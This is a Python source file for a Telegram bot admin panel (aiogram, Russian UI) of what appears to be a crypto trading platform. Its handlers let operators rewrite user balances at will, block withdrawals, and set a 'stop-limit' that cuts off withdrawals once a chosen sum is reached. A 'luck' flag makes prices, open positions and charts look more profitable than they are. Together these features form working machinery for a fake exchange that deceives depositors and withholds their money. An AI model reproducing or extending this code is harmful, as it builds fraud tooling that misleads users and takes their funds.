from aiogram import Router, F, types, Bot
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from api.user import verify_user, ban_user, set_user_luck, get_user_info, set_withdraw_ban, set_stop_limit, set_stop_limit_amount
import logging

from filters.is_admin import IsAdmin
from keyboards.admin_kb import get_admin_panel_keyboard
from api.balance import get_user_balance, update_asset_balance

router = Router()

class AdminActions(StatesGroup):
    waiting_for_user_id_for_balance = State()
    waiting_for_asset_choice_to_update = State()
    waiting_for_new_balance = State()
    waiting_for_user_id_for_verification = State()
    waiting_for_user_id_for_dialog = State()
    waiting_for_message_for_dialog = State()
    waiting_for_user_id_for_ban = State()
    waiting_for_user_id_for_luck = State()
    waiting_for_user_id_for_withdraw_block = State()
    waiting_for_user_id_for_stop_limit = State()
    waiting_for_user_id_for_stop_limit_amount = State()
    waiting_for_stop_limit_amount = State()


@router.message(Command("admin"), IsAdmin())
async def cmd_admin_panel(message: Message):
    await message.answer(
        "Добро пожаловать в панель администратора!",
        reply_markup=get_admin_panel_keyboard()
    )

@router.callback_query(F.data == "admin_stop_limit", IsAdmin())
async def start_stop_limit_handler(callback: CallbackQuery, state: FSMContext):
    """
    Начинает процесс включения/выключения стоп-лимита
    """
    await callback.message.edit_text(
        "⭕️ <b>Управление стоп-лимитом</b>\n\n"
        "Введите Telegram ID пользователя для управления стоп-лимитом.\n\n"
        "Когда стоп-лимит активен:\n"
        "• При достижении установленной суммы вывода автоматически блокируется\n"
        "• Пользователь не сможет выводить средства до снятия блокировки\n\n"
        "Введите ID пользователя:",
        parse_mode="HTML"
    )
    await state.set_state(AdminActions.waiting_for_user_id_for_stop_limit)
    await callback.answer()


@router.message(AdminActions.waiting_for_user_id_for_stop_limit, IsAdmin())
async def process_user_id_for_stop_limit(message: Message, state: FSMContext):
    """
    Получить ID пользователя и показать текущий статус стоп-лимита
    """
    if not message.text.isdigit():
        await message.answer("❌ ID должен быть числом. Попробуйте еще раз.")
        return

    user_id = int(message.text)
    
    user_info = await get_user_info(user_id)
    
    if user_info is None:
        await message.answer(f"❌ Пользователь с ID {user_id} не найден в системе.")
        await state.clear()
        return
    
    has_stop_limit = user_info.get('hasStopLimit', False)
    stop_limit_amount = user_info.get('stopLimit', 0)
    
    builder = InlineKeyboardBuilder()
    
    if has_stop_limit:
        builder.row(
            types.InlineKeyboardButton(
                text="❌ Отключить стоп-лимит",
                callback_data=f"stop_limit_toggle_{user_id}_false"
            )
        )
        status_emoji = "🟢"
        status_text = "ВКЛЮЧЕН"
    else:
        builder.row(
            types.InlineKeyboardButton(
                text="✅ Включить стоп-лимит",
                callback_data=f"stop_limit_toggle_{user_id}_true"
            )
        )
        status_emoji = "🔴"
        status_text = "ВЫКЛЮЧЕН"
    
    builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
    
    await message.answer(
        f"👤 <b>Пользователь:</b> ID {user_id}\n\n"
        f"{status_emoji} <b>Статус стоп-лимита:</b> {status_text}\n"
        f"💰 <b>Сумма стоп-лимита:</b> ${stop_limit_amount}\n\n"
        f"Выберите действие:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    
    await state.clear()


@router.callback_query(F.data.startswith("stop_limit_toggle_"), IsAdmin())
async def process_stop_limit_toggle(callback: CallbackQuery):
    """
    Переключить флаг стоп-лимита для пользователя
    """
    parts = callback.data.split('_')
    user_id = int(parts[3])
    new_status = parts[4] == 'true'
    
    success = await set_stop_limit(user_id, new_status)
    
    if success:
        status = "включен" if new_status else "выключен"
        emoji = "🟢" if new_status else "🔴"
        
        await callback.answer(f"✅ Стоп-лимит {status}!", show_alert=True)
        
        # Обновляем сообщение с новым статусом
        user_info = await get_user_info(user_id)
        stop_limit_amount = user_info.get('stopLimit', 0) if user_info else 0
        
        builder = InlineKeyboardBuilder()
        
        if new_status:
            builder.row(
                types.InlineKeyboardButton(
                    text="❌ Отключить стоп-лимит",
                    callback_data=f"stop_limit_toggle_{user_id}_false"
                )
            )
            status_text = "ВКЛЮЧЕН"
        else:
            builder.row(
                types.InlineKeyboardButton(
                    text="✅ Включить стоп-лимит",
                    callback_data=f"stop_limit_toggle_{user_id}_true"
                )
            )
            status_text = "ВЫКЛЮЧЕН"
        
        builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
        
        await callback.message.edit_text(
            f"👤 <b>Пользователь:</b> ID {user_id}\n\n"
            f"{emoji} <b>Статус стоп-лимита:</b> {status_text}\n"
            f"💰 <b>Сумма стоп-лимита:</b> ${stop_limit_amount}\n\n"
            f"Выберите действие:",
            reply_markup=builder.as_markup(),
            parse_mode="HTML"
        )
    else:
        await callback.answer(
            f"❌ Не удалось изменить статус стоп-лимита для пользователя {user_id}",
            show_alert=True
        )


@router.callback_query(F.data == "admin_stop_limit_amount", IsAdmin())
async def start_stop_limit_amount_handler(callback: CallbackQuery, state: FSMContext):
    """
    Начинает процесс установки суммы стоп-лимита
    """
    await callback.message.edit_text(
        "💰 <b>Установка суммы стоп-лимита</b>\n\n"
        "Введите Telegram ID пользователя:",
        parse_mode="HTML"
    )
    await state.set_state(AdminActions.waiting_for_user_id_for_stop_limit_amount)
    await callback.answer()


@router.message(AdminActions.waiting_for_user_id_for_stop_limit_amount, IsAdmin())
async def process_user_id_for_stop_limit_amount(message: Message, state: FSMContext):
    """
    Получить ID и запросить сумму
    """
    if not message.text.isdigit():
        await message.answer("❌ ID должен быть числом. Попробуйте еще раз.")
        return

    user_id = int(message.text)
    
    user_info = await get_user_info(user_id)
    
    if user_info is None:
        await message.answer(f"❌ Пользователь с ID {user_id} не найден в системе.")
        await state.clear()
        return
    
    current_limit = user_info.get('stopLimit', 0)
    
    await state.update_data(stop_limit_user_id=user_id)
    
    await message.answer(
        f"💰 <b>Текущая сумма стоп-лимита:</b> ${current_limit}\n\n"
        f"Введите новую сумму стоп-лимита (в долларах):",
        parse_mode="HTML"
    )
    await state.set_state(AdminActions.waiting_for_stop_limit_amount)


@router.message(AdminActions.waiting_for_stop_limit_amount, IsAdmin())
async def process_stop_limit_amount(message: Message, state: FSMContext):
    """
    Установить сумму стоп-лимита
    """
    try:
        amount = float(message.text)
        if amount < 0:
            await message.answer("❌ Сумма не может быть отрицательной. Попробуйте еще раз.")
            return
    except ValueError:
        await message.answer("❌ Неверный формат суммы. Введите число (например, 1000 или 500.50).")
        return

    user_data = await state.get_data()
    user_id = user_data.get('stop_limit_user_id')
    
    success = await set_stop_limit_amount(user_id, int(amount))
    
    if success:
        await message.answer(
            f"✅ Сумма стоп-лимита для пользователя {user_id} установлена: ${amount}"
        )
    else:
        await message.answer(
            f"❌ Не удалось установить сумму стоп-лимита для пользователя {user_id}"
        )
    
    await state.clear()
    await cmd_admin_panel(message)

@router.callback_query(F.data == "admin_verify", IsAdmin())
async def process_verify_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введите Telegram ID пользователя для верификации:")
    await state.set_state(AdminActions.waiting_for_user_id_for_verification)
    await callback.answer()

@router.message(AdminActions.waiting_for_user_id_for_verification, IsAdmin())
async def process_user_id_for_verification(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("ID должен быть числом. Попробуйте еще раз.")
        return

    tgid = int(message.text)

    success = await verify_user(tgid)

    if success:
        await message.answer(f"✅ Пользователь с ID {tgid} успешно верифицирован.")
    else:
        await message.answer(f"❌ Не удалось верифицировать пользователя {tgid}. Проверьте логи или существование пользователя.")

    await state.clear()
    await cmd_admin_panel(message)

@router.callback_query(F.data == "admin_balance", IsAdmin())
async def process_balance_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введите Telegram ID пользователя, чтобы посмотреть или изменить его баланс:")
    await state.set_state(AdminActions.waiting_for_user_id_for_balance)
    await callback.answer()

@router.message(AdminActions.waiting_for_user_id_for_balance, IsAdmin())
async def process_user_id_for_balance(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("ID должен быть числом. Попробуйте еще раз.")
        return

    user_id = int(message.text)
    
    balance_data = await get_user_balance(user_id)

    if balance_data is None:
        await message.answer("❌ Произошла ошибка при подключении к API. Попробуйте позже.")
        await state.clear()
        return
    
    if not balance_data:
        await message.answer(f"✅ Пользователь с ID {user_id} найден, но у него нет активов на балансе.")
        await state.clear()
        return

    response_text = f"Балансы пользователя {user_id}:\n\n"
    builder = InlineKeyboardBuilder()

    for asset in balance_data:
        asset_id = asset.get('id')
        crypto_id = asset.get('cryptocurrencyId')
        amount = asset.get('amount')
        
        crypto_name = f"Crypto_{crypto_id}" 
        
        response_text += f"<b>{crypto_name}:</b> <code>{amount}</code>\n"
        builder.row(
            types.InlineKeyboardButton(
                text=f"✏️ Изменить {crypto_name}", 
                callback_data=f"update_asset_{asset_id}"
            )
        )
    
    response_text += "\nВыберите актив для изменения или отправьте /admin для выхода."
    builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
    
    await message.answer(response_text, reply_markup=builder.as_markup(), parse_mode="HTML")
    
    await state.update_data(user_id=user_id)
    await state.set_state(AdminActions.waiting_for_asset_choice_to_update)

@router.callback_query(F.data.startswith("update_asset_"), AdminActions.waiting_for_asset_choice_to_update, IsAdmin())
async def process_asset_choice(callback: CallbackQuery, state: FSMContext):
    asset_balance_id = callback.data.split('_')[-1]
    
    await state.update_data(asset_balance_id_to_update=asset_balance_id)
    
    await callback.message.edit_text("Введите новую сумму для этого актива:")
    await state.set_state(AdminActions.waiting_for_new_balance)
    await callback.answer()


@router.message(AdminActions.waiting_for_new_balance, IsAdmin())
async def process_new_balance(message: Message, state: FSMContext):
    try:
        new_balance = float(message.text)
    except ValueError:
        await message.answer("Неверный формат суммы. Введите число (например, 123.45).")
        return

    user_data = await state.get_data()
    asset_balance_id = user_data.get('asset_balance_id_to_update')
    user_id = user_data.get('user_id')

    success = await update_asset_balance(asset_balance_id, new_balance)

    if success:
        await message.answer(f"✅ Баланс актива для пользователя {user_id} успешно обновлен.")
    else:
        await message.answer("❌ Не удалось обновить баланс. Проверьте логи сервера.")

    await state.clear()
    await cmd_admin_panel(message)

@router.callback_query(F.data == "admin_luck", IsAdmin())
async def process_luck_start(callback: CallbackQuery, state: FSMContext):
    """Начать процесс управления удачей пользователя"""
    await callback.message.edit_text(
        "🍀 <b>Управление удачей</b>\n\n"
        "Введите Telegram ID пользователя для управления флагом удачи.\n\n"
        "Когда флаг 'isLucky' активен:\n"
        "• Цены будут подкручиваться в пользу пользователя\n"
        "• Его открытые позиции будут выглядеть более прибыльными\n"
        "• Графики будут отображаться с выгодными ценами\n\n"
        "Введите ID пользователя:",
        parse_mode="HTML"
    )
    await state.set_state(AdminActions.waiting_for_user_id_for_luck)
    await callback.answer()


@router.message(AdminActions.waiting_for_user_id_for_luck, IsAdmin())
async def process_user_id_for_luck(message: Message, state: FSMContext):
    """Получить ID пользователя и показать текущий статус удачи"""
    if not message.text.isdigit():
        await message.answer("❌ ID должен быть числом. Попробуйте еще раз.")
        return

    user_id = int(message.text)
    
    user_info = await get_user_info(user_id)
    
    if user_info is None:
        await message.answer(f"❌ Пользователь с ID {user_id} не найден в системе.")
        await state.clear()
        return
    
    is_lucky = user_info.get('isLucky', False)
    username = user_info.get('username', 'Unknown')
    
    builder = InlineKeyboardBuilder()
    
    if is_lucky:
        builder.row(
            types.InlineKeyboardButton(
                text="❌ Отключить удачу",
                callback_data=f"luck_toggle_{user_id}_false"
            )
        )
        status_emoji = "🟢"
        status_text = "ВКЛЮЧЕНА"
    else:
        builder.row(
            types.InlineKeyboardButton(
                text="✅ Включить удачу",
                callback_data=f"luck_toggle_{user_id}_true"
            )
        )
        status_emoji = "🔴"
        status_text = "ВЫКЛЮЧЕНА"
    
    builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
    
    await message.answer(
        f"👤 <b>Пользователь:</b> @{username} (ID: {user_id})\n\n"
        f"{status_emoji} <b>Статус удачи:</b> {status_text}\n\n"
        f"Выберите действие:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    
    await state.clear()


@router.callback_query(F.data.startswith("luck_toggle_"), IsAdmin())
async def process_luck_toggle(callback: CallbackQuery, state: FSMContext):
    """Переключить флаг удачи для пользователя"""
    parts = callback.data.split('_')
    user_id = int(parts[2])
    new_luck_status = parts[3] == 'true'
    
    success = await set_user_luck(user_id, new_luck_status)
    
    if success:
        status = "включена" if new_luck_status else "выключена"
        emoji = "🟢" if new_luck_status else "🔴"
        
        await callback.answer(f"✅ Удача {status}!", show_alert=True)
        
        # Обновляем сообщение с новым статусом
        user_info = await get_user_info(user_id)
        username = user_info.get('username', 'Unknown') if user_info else 'Unknown'
        
        builder = InlineKeyboardBuilder()
        
        if new_luck_status:
            builder.row(
                types.InlineKeyboardButton(
                    text="❌ Отключить удачу",
                    callback_data=f"luck_toggle_{user_id}_false"
                )
            )
            status_text = "ВКЛЮЧЕНА"
        else:
            builder.row(
                types.InlineKeyboardButton(
                    text="✅ Включить удачу",
                    callback_data=f"luck_toggle_{user_id}_true"
                )
            )
            status_text = "ВЫКЛЮЧЕНА"
        
        builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back_to_main"))
        
        await callback.message.edit_text(
            f"👤 <b>Пользователь:</b> @{username} (ID: {user_id})\n\n"
            f"{emoji} <b>Статус удачи:</b> {status_text}\n\n"
            f"Выберите действие:",
            reply_markup=builder.as_markup(),
            parse_mode="HTML"
        )
    else:
        await callback.answer(
            f"❌ Не удалось изменить статус удачи для пользователя {user_id}",
            show_alert=True
        )


@router.callback_query(F.data == "admin_back_to_main", IsAdmin())
async def process_back(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "Действие отменено. Вы в главном меню админ-панели.",
        reply_markup=get_admin_panel_keyboard()
    )
    await callback.answer()

@router.message(Command("admin"), IsAdmin())
async def cancel_and_show_panel(message: Message, state: FSMContext):
    await state.clear()
    await cmd_admin_panel(message)

@router.callback_query(F.data == "admin_dialog", IsAdmin())
async def start_dialog_handler(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "Введите Telegram ID пользователя, которому вы хотите отправить сообщение. "
        "Или отправьте /cancel для отмены."
    )
    await state.set_state(AdminActions.waiting_for_user_id_for_dialog)
    await callback.answer()

@router.message(AdminActions.waiting_for_user_id_for_dialog, IsAdmin())
async def process_user_id_for_dialog(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Ошибка: Telegram ID должен быть числом. Попробуйте еще раз.")
        return

    await state.update_data(dialog_user_id=int(message.text))
    
    await message.answer(
        f"Отлично. Теперь введите сообщение, которое хотите отправить пользователю с ID {message.text}. "
        "Или отправьте /cancel для отмены."
    )
    await state.set_state(AdminActions.waiting_for_message_for_dialog)

@router.message(AdminActions.waiting_for_message_for_dialog, IsAdmin())
async def process_message_for_dialog(message: Message, state: FSMContext, bot: Bot):
    user_data = await state.get_data()
    user_id_to_send = user_data.get('dialog_user_id')
    
    message_text = message.text
    
    try:
        await bot.send_message(
            chat_id=user_id_to_send,
            text=f"Сообщение от администратора:\n\n{message_text}"
        )
        await message.answer(f"✅ Сообщение успешно отправлено пользователю {user_id_to_send}.")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить сообщение пользователю {user_id_to_send}.\n\nОшибка: {e}")
    
    await state.clear()
    
    await cmd_admin_panel(message)


@router.message(Command("cancel"))
async def cancel_handler(message: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        return

    logging.info("Cancelling state %r", current_state)
    await state.clear()
    await message.answer("Действие отменено.")
    await cmd_admin_panel(message)

@router.callback_query(F.data == "admin_block_bot", IsAdmin())
async def start_ban_handler(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "Введите Telegram ID пользователя, которого вы хотите заблокировать. "
        "Или отправьте /cancel для отмены."
    )
    await state.set_state(AdminActions.waiting_for_user_id_for_ban)
    await callback.answer()

@router.message(AdminActions.waiting_for_user_id_for_ban, IsAdmin())
async def process_user_id_for_ban(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Ошибка: Telegram ID должен быть числом. Попробуйте еще раз.")
        return

    tgid = int(message.text)
    
    success = await ban_user(tgid, ban_status=True)
    
    if success:
        await message.answer(f"✅ Пользователь с ID {tgid} успешно заблокирован.")
    else:
        await message.answer(f"❌ Не удалось заблокировать пользователя {tgid}. Проверьте логи или существование пользователя.")
        
    await state.clear()
    await cmd_admin_panel(message)

@router.callback_query(F.data == "admin_block_withdraw", IsAdmin())
async def start_withdraw_block_handler(callback: CallbackQuery, state: FSMContext):
    """
    Начинает процесс блокировки вывода. Запрашивает ID пользователя.
    """
    await callback.message.edit_text(
        "Введите Telegram ID пользователя, для которого нужно управлять блокировкой вывода средств. "
        "Или отправьте /cancel для отмены."
    )
    # Устанавливаем состояние ожидания ID
    await state.set_state(AdminActions.waiting_for_user_id_for_withdraw_block)
    await callback.answer()

@router.message(AdminActions.waiting_for_user_id_for_withdraw_block, IsAdmin())
async def process_user_id_for_withdraw_block(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Ошибка: Telegram ID должен быть числом. Попробуйте еще раз.")
        return

    user_id = int(message.text)
    
    # Получаем полную информацию о пользователе
    user_info = await get_user_info(user_id)
    
    if user_info is None:
        await message.answer(f"❌ Пользователь с ID {user_id} не найден.")
        await state.clear()
        return
    
    is_banned = user_info.get('isBannedWithdraw', False)
    
    builder = InlineKeyboardBuilder()
    if is_banned:
        builder.row(types.InlineKeyboardButton(
            text="✅ Разблокировать вывод",
            callback_data=f"withdraw_toggle_{user_id}_false"
        ))
        status_text = "🔴 ЗАБЛОКИРОВАН"
    else:
        builder.row(types.InlineKeyboardButton(
            text="❌ Заблокировать вывод",
            callback_data=f"withdraw_toggle_{user_id}_true"
        ))
        status_text = "🟢 АКТИВЕН"
        
    builder.row(types.InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="admin_back_to_main"))

    await message.answer(
        f"Управление выводом средств для пользователя <code>{user_id}</code>\n\n"
        f"Текущий статус: <b>{status_text}</b>\n\n"
        "Выберите действие:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.clear()


# Обработчик нажатия на кнопки "Заблокировать" / "Разблокировать"
@router.callback_query(F.data.startswith("withdraw_toggle_"), IsAdmin())
async def process_withdraw_toggle(callback: CallbackQuery):
    """
    Переключает флаг блокировки вывода для пользователя.
    """
    parts = callback.data.split('_')
    user_id = int(parts[2])
    new_ban_status = parts[3] == 'true'
    
    success = await set_withdraw_ban(user_id, new_ban_status)
    
    if success:
        action_text = "заблокирован" if new_ban_status else "разблокирован"
        await callback.answer(f"✅ Вывод средств для пользователя {user_id} {action_text}.", show_alert=True)
        
        # Обновляем сообщение с кнопками, чтобы показать новый статус
        # (этот код дублирует предыдущий обработчик для обновления UI)
        user_info = await get_user_info(user_id)
        if user_info:
            is_banned = user_info.get('isBannedWithdraw', False)
            builder = InlineKeyboardBuilder()
            if is_banned:
                builder.row(types.InlineKeyboardButton(text="✅ Разблокировать вывод", callback_data=f"withdraw_toggle_{user_id}_false"))
                status_text = "🔴 ЗАБЛОКИРОВАН"
            else:
                builder.row(types.InlineKeyboardButton(text="❌ Заблокировать вывод", callback_data=f"withdraw_toggle_{user_id}_true"))
                status_text = "🟢 АКТИВЕН"
            builder.row(types.InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="admin_back_to_main"))
            await callback.message.edit_text(
                f"Управление выводом средств для пользователя <code>{user_id}</code>\n\n"
                f"Текущий статус: <b>{status_text}</b>\n\n"
                "Выберите действие:",
                reply_markup=builder.as_markup(),
                parse_mode="HTML"
            )
    else:
        await callback.answer("❌ Не удалось изменить статус блокировки вывода.", show_alert=True)